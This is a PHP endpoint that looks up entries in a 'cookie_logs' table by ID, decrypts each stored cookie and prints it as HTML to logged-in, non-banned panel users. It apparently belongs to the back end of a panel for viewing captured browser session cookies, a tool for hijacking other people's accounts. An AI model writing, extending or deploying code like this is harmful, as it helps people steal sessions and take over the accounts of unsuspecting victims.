<?php
    @session_start();
    require_once 'includes/functions.php';

    header('Content-type: application/json; charset=UTF-8');
    
    $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
    $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();

     if (isset($_POST['id']) && !empty($_POST['id'])){

        if($banned == 0){

            $get = pdoQuery($db, "SELECT * FROM `cookie_logs` WHERE `cookieID`=?", [htmlspecialchars($_POST['id'])]);
            $results = $get->fetchAll(PDO::FETCH_ASSOC);

            foreach($results as $result){
                $cookie = decrypt(htmlspecialchars($result['cookie']));

                echo "<div class='d-flex justify-content-start bd-highlight mb-2 text-muted text-left text-darkwhite'>
                <div class='p-2 bd-highlight'>$cookie</div>
                </div>";
            }
        }else{
            echo "<div class='d-flex justify-content-start bd-highlight mb-2 text-muted text-left text-lightred'>
            <div class='p-2 bd-highlight'>You are banned. :'D</div>
            </div>";
        }
     }
?>